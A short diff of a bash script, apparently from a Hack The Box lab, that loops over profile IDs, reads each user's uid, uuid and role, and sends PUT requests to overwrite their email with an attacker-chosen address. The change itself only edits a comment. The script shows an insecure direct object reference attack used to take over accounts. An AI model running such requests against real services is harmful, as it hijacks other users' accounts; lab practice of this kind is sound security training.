@@ -17,7 +17,7 @@ for i in {1..10}; do
     role2=$(echo "$response" | jq -r '.role')
     echo "UID: $uid, UUID: $uuid, Role: $role2, Email: $email"
 
-    # Step 2: Make a PUT request to update the email using uid, uuid, and the Cookie header
+    # Step 2: Make a PUT request to update the email using uid, uuid, role, and the Cookie header
     new_email="Cartier1337PwnedUEz@htb.com"
     update_response=$(curl -s -X PUT "$url/profile/api.php/profile/$i" \
         -H "Content-Type: application/json" \
